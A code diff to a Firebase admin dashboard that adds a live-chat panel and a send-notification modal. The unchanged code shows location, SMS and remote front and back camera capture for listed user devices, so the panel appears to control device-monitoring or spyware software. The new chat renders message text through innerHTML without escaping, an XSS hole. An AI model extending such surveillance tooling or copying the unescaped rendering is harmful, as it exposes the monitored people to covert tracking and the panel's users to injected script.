@@ -15,6 +15,7 @@
             --accent-blue: #58a6ff;
             --accent-green: #3fb950;
             --accent-red: #f85149;
+            --accent-purple: #9b59b6;
             --text-primary: #c9d1d9;
             --text-secondary: #8b949e;
             --border-color: rgba(240, 246, 252, 0.1);
@@ -121,10 +122,13 @@
             justify-content: space-between;
             align-items: center;
             margin-bottom: 2rem;
+            flex-wrap: wrap;
+            gap: 1rem;
         }
         .main-header h1 { font-size: 2.25rem; color: #fff; }
-        #logout-btn {
-            background: var(--accent-red);
+        .header-buttons { display: flex; gap: 1rem; align-items: center; }
+        
+        #send-notification-btn, #logout-btn {
             color: white;
             padding: 10px 15px;
             border: none;
@@ -133,6 +137,8 @@
             font-size: 14px;
             font-weight: 600;
         }
+        #send-notification-btn { background: var(--accent-green); display: none; }
+        #logout-btn { background: var(--accent-red); }
 
         #details-view { display: none; }
         .category-buttons {
@@ -346,7 +352,7 @@
             border-radius: 18px;
             max-width: 75%;
             word-wrap: break-word;
-            background-color: var(--secondary-dark); /* Grey for all */
+            background-color: var(--secondary-dark);
             color: var(--text-primary);
         }
         .sms-bubble.incoming {
@@ -405,7 +411,42 @@
         }
         .modal-header h3 { margin: 0; color: #fff; }
         .modal-body { overflow-y: auto; text-align: left; padding: 1rem 0; }
+        .modal-body textarea, .modal-body input {
+            width: 100%;
+            padding: 10px;
+            background-color: var(--secondary-dark);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-primary);
+            font-size: 1rem;
+            margin-bottom: 1rem;
+        }
+        .modal-footer {
+            margin-top: 1rem;
+            text-align: right;
+        }
+        .modal-footer button {
+            background-color: var(--accent-blue);
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+        }
         .modal-close-btn { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-primary); }
+
+        /* NEW Chat Styles */
+        .live-chat-area { display: flex; flex-direction: column; height: 100%; }
+        .chat-messages { flex-grow: 1; overflow-y: auto; padding: 1rem; display: flex; flex-direction: column-reverse; gap: 0.75rem; }
+        .chat-bubble { padding: 10px 15px; border-radius: 18px; max-width: 75%; word-wrap: break-word; line-height: 1.4; }
+        .chat-bubble .chat-time { font-size: 0.7rem; opacity: 0.7; margin-top: 4px; display: block; text-align: right; }
+        .chat-bubble.admin { background-color: var(--accent-blue); color: #fff; align-self: flex-end; border-bottom-right-radius: 4px; }
+        .chat-bubble.user { background-color: var(--secondary-dark); color: var(--text-primary); align-self: flex-start; border-bottom-left-radius: 4px; }
+        .chat-input-area { display: flex; padding: 1rem; border-top: 1px solid var(--border-color); gap: 1rem; }
+        .chat-input-area input { flex-grow: 1; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); background: var(--secondary-dark); color: var(--text-primary); }
+        .chat-input-area input:focus { outline: none; border-color: var(--accent-blue); }
+        .chat-input-area button { background-color: var(--accent-blue); border: none; border-radius: 8px; padding: 0 16px; cursor: pointer; color: white; }
 
         #menu-btn {
             display: none;
@@ -481,7 +522,10 @@
                     <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
                 </button>
                 <h1 id="main-content-title">Select a User</h1>
-                <button id="logout-btn">Logout</button>
+                <div class="header-buttons">
+                    <button id="send-notification-btn">Send Notification</button>
+                    <button id="logout-btn">Logout</button>
+                </div>
             </header>
 
             <div id="details-view">
@@ -506,6 +550,10 @@
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
                         <span>Notifications</span>
                     </button>
+                    <button class="category-btn" data-category="chat">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-purple)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
+                        <span>Live Chat</span>
+                    </button>
                 </div>
             </div>
         </main>
@@ -516,16 +564,31 @@
         <div class="modal-content">
             <div class="modal-header">
                 <h3 id="modal-title">Data</h3>
-                <button id="modal-close-btn" class="modal-close-btn">&times;</button>
+                <button id="modal-close-btn" class="modal-close-btn">×</button>
             </div>
             <div class="modal-body" id="modal-data-display-area"></div>
         </div>
     </div>
     
+    <div id="notification-modal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 500px;">
+            <div class="modal-header">
+                <h3 id="notification-modal-title">Send Notification to User</h3>
+                <button class="modal-close-btn" data-target="notification-modal">×</button>
+            </div>
+            <div class="modal-body">
+                <textarea id="notification-message-input" rows="4" placeholder="Enter your message..."></textarea>
+            </div>
+            <div class="modal-footer">
+                <button id="send-notification-submit-btn">Send</button>
+            </div>
+        </div>
+    </div>
+
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
         import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
-        import { getDatabase, ref, onValue, remove, update } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+        import { getDatabase, ref, onValue, remove, update, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
         import { getStorage, ref as storageRef, listAll, getDownloadURL, getMetadata, deleteObject } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";
 
         // Your NEW Firebase configuration
@@ -545,7 +608,7 @@
         const db = getDatabase(app);
         const storage = getStorage(app);
 
-        // The rest of the script remains the same as the original admin.html
+        // --- Existing DOM Elements ---
         const loginContainer = document.getElementById('login-container');
         const dashboard = document.getElementById('dashboard');
         const userList = document.getElementById('user-list');
@@ -559,10 +622,18 @@
         const modalTitle = document.getElementById('modal-title');
         const modalDataDisplayArea = document.getElementById('modal-data-display-area');
         const modalCloseBtn = document.getElementById('modal-close-btn');
+        
+        // --- NEW DOM Elements ---
+        const sendNotificationBtn = document.getElementById('send-notification-btn');
+        const notificationModal = document.getElementById('notification-modal');
+        const sendNotificationSubmitBtn = document.getElementById('send-notification-submit-btn');
+        const notificationMessageInput = document.getElementById('notification-message-input');
+
 
         let activeDataListener = null;
         let selectedUserInfo = {};
 
+        // --- Existing Auth Logic ---
         document.getElementById('login-btn').addEventListener('click', () => { signInWithEmailAndPassword(auth, document.getElementById('email').value, document.getElementById('password').value).catch(error => document.getElementById('error-message').textContent = "Login Failed. Ensure you are an admin."); });
         document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));
 
@@ -612,7 +683,8 @@
                 }
             });
         }
-
+        
+        // --- Existing Event Listeners with minor additions ---
         userList.addEventListener('click', (e) => {
             const listItem = e.target.closest('.user-list-item');
             if (listItem) {
@@ -621,6 +693,7 @@
                 selectedUserInfo = { userId: listItem.dataset.userid, childKey: listItem.dataset.childkey, userName: listItem.dataset.username, deviceName: listItem.dataset.devicename };
                 mainContentTitle.textContent = `${selectedUserInfo.userName} (${selectedUserInfo.deviceName})`;
                 detailsView.style.display = 'block';
+                sendNotificationBtn.style.display = 'inline-flex'; // Show notification button
                 
                 document.querySelectorAll('.category-btn').forEach(btn => btn.classList.remove('active'));
                 if (dataModal.style.display === 'flex') {
@@ -650,14 +723,21 @@
         }
         
         function displayCategoryData(category) {
-            if (activeDataListener) { activeDataListener(); }
+            if (activeDataListener) { activeDataListener(); activeDataListener = null; }
             modalDataDisplayArea.innerHTML = '<div class="loader"></div>';
             const { userId, childKey } = selectedUserInfo;
             if (!userId || !childKey) return;
+
+            // --- Modified to handle photo and chat ---
             if (category === 'photo') {
                 renderPhotosFromStorage(userId, childKey);
                 return;
             }
+             if (category === 'chat') {
+                renderChat(userId, childKey);
+                return;
+            }
+
             const dataPath = `user/${userId}/${childKey}/${getCategoryPath(category)}`;
             const dataRef = ref(db, dataPath);
             activeDataListener = onValue(dataRef, (snapshot) => {
@@ -671,6 +751,7 @@
             });
         }
         
+        // --- All existing rendering functions (renderPhotos, getCategoryPath, renderData) remain the same ---
         async function renderPhotosFromStorage(userId, childKey) {
             const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="0"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="1"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button><button class="clear-category-btn" data-category="photo"><span>Clear Photos</span></button></div>`;
             modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
@@ -697,7 +778,6 @@
                 modalDataDisplayArea.innerHTML = headerHTML + `<p>Error loading photos. (Error Code: ${error.code})</p>`;
             }
         }
-
         function getCategoryPath(category) {
             switch(category) {
                 case 'location': return 'location/data';
@@ -708,7 +788,6 @@
                 default: return '';
             }
         }
-
         function renderData(category, data) {
             let headerHTML = '';
             let contentHTML = '';
@@ -785,6 +864,70 @@
             modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
         }
 
+        // --- NEW CHAT RENDER FUNCTION ---
+        function renderChat(userId, childKey) {
+            modalTitle.textContent = `Live Chat with ${selectedUserInfo.userName}`;
+            modalDataDisplayArea.innerHTML = `
+                <div class="live-chat-area">
+                    <div class="chat-messages" id="chat-messages-area">
+                        <div class="loader"></div>
+                    </div>
+                    <div class="chat-input-area">
+                        <input type="text" id="chat-message-input" placeholder="Type a message...">
+                        <button id="chat-send-btn">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+                        </button>
+                    </div>
+                </div>
+            `;
+
+            const chatMessagesArea = document.getElementById('chat-messages-area');
+            const chatMessageInput = document.getElementById('chat-message-input');
+            const chatSendBtn = document.getElementById('chat-send-btn');
+            
+            const chatPath = `chats/${userId}/${childKey}/messages`;
+            const chatRef = ref(db, chatPath);
+
+            activeDataListener = onValue(chatRef, (snapshot) => {
+                chatMessagesArea.innerHTML = '';
+                const messages = snapshot.val();
+                if (messages) {
+                    const sortedKeys = Object.keys(messages).sort((a,b) => messages[a].timestamp - messages[b].timestamp);
+                    sortedKeys.forEach(key => {
+                        const message = messages[key];
+                        const bubble = document.createElement('div');
+                        bubble.classList.add('chat-bubble', message.sender);
+                        const time = message.timestamp ? new Date(message.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : '';
+                        bubble.innerHTML = `${message.text}<span class="chat-time">${time}</span>`;
+                        chatMessagesArea.prepend(bubble);
+                    });
+                } else {
+                    chatMessagesArea.innerHTML = '<p style="text-align:center; padding: 2rem;">No messages yet. Start the conversation!</p>';
+                }
+            });
+
+            const sendMessage = () => {
+                const messageText = chatMessageInput.value.trim();
+                if (messageText) {
+                    const messagesRef = ref(db, `chats/${userId}/${childKey}/messages`);
+                    push(messagesRef, {
+                        text: messageText,
+                        sender: 'admin',
+                        timestamp: serverTimestamp()
+                    });
+                    chatMessageInput.value = '';
+                }
+            };
+
+            chatSendBtn.addEventListener('click', sendMessage);
+            chatMessageInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    sendMessage();
+                }
+            });
+        }
+        
+        // --- Existing Event Listener on Data Area ---
         modalDataDisplayArea.addEventListener('click', (e) => {
             const button = e.target.closest('button');
             if (!button) return;
@@ -829,7 +972,8 @@
                 displayCategoryData('photo'); 
             }
         });
-
+        
+        // --- All existing functions (clearAllPhotos, menu toggles) remain the same ---
         async function clearAllPhotos(userId, childKey) {
             const photoStoragePath = `user/${userId}/${childKey}/photo`;
             if (!confirm(`Are you sure you want to delete all photos for '${selectedUserInfo.userName}'? This cannot be undone.`)) return;
@@ -847,13 +991,53 @@
                 displayCategoryData('photo');
             }
         }
-
+        
         menuBtn.addEventListener('click', () => sidebar.classList.add('open'));
         overlay.addEventListener('click', () => sidebar.classList.remove('open'));
         modalCloseBtn.addEventListener('click', () => {
             if (activeDataListener) { activeDataListener(); activeDataListener = null; }
             dataModal.style.display = 'none';
         });
+
+        // --- NEW Notification Modal Logic ---
+        sendNotificationBtn.addEventListener('click', () => {
+            if (selectedUserInfo.userId) {
+                document.getElementById('notification-modal-title').textContent = `Send Notification to ${selectedUserInfo.userName}`;
+                notificationMessageInput.value = '';
+                notificationModal.style.display = 'flex';
+            } else {
+                alert('Please select a user first.');
+            }
+        });
+
+        sendNotificationSubmitBtn.addEventListener('click', () => {
+            const message = notificationMessageInput.value.trim();
+            if (message && selectedUserInfo.userId && selectedUserInfo.childKey) {
+                const notificationPath = `user/${selectedUserInfo.userId}/${selectedUserInfo.childKey}/adminNotifications`;
+                const notificationsRef = ref(db, notificationPath);
+                push(notificationsRef, {
+                    message: message,
+                    timestamp: serverTimestamp(),
+                    read: false
+                }).then(() => {
+                    alert('Notification sent successfully!');
+                    notificationModal.style.display = 'none';
+                }).catch(error => {
+                    alert('Failed to send notification: ' + error.message);
+                });
+            }
+        });
+
+        // Close modal buttons
+        document.querySelectorAll('.modal-close-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const modalId = btn.dataset.target;
+                if(modalId) {
+                    document.getElementById(modalId).style.display = 'none';
+                }
+            });
+        });
+
     </script>
 </body>
 </html>
